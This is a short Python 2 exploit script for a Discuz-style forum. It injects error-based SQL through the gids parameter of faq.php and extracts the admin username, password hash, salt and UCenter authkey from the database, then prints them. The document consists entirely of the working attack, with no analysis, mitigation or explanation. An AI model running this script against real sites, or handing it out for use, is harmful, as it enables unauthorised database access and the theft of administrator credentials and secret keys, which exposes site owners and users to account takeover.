import re
import requests

url = raw_input('Url:')

def get_data(url,payload):
	pattern = re.compile('~([0-9a-zA-Z]+?)~')
	res = requests.get(url + payload)
	return pattern.search(res.content).group(1)

payload = "/faq.php?action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(%s),0x7e)x from information_schema.tables group by x)a)-- -"

get_admin_n = payload % ('select username from cdb_uc_members limit 1')
admin_n = get_data(url,get_admin_n)
print '[!]Admin: %s' % admin_n

get_admin_p = payload % ('select password from cdb_uc_members limit 1')
admin_p = get_data(url,get_admin_p)
print '[!]Password: %s' % admin_p

get_salt = payload % ('select salt from cdb_uc_members limit 1')
salt = get_data(url,get_salt)
print '[!]Salt: %s' % salt

get_authkey_len = payload % 'select length(authkey) from cdb_uc_applications limit 1'
length = get_data(url,get_authkey_len)
get_authkey1 = payload % ('select substr(authkey,1,' + str(int(length)/2) + ') from cdb_uc_applications limit 1')
authkey1 = get_data(url,get_authkey1)
get_authkey2 = payload % ('select substr(authkey,' + str(int(length)/2+1) + ',%s) from cdb_uc_applications limit 1' % length)
authkey2 = get_data(url,get_authkey2)
print '[!]Uc_key: %s' % (authkey1 + authkey2)
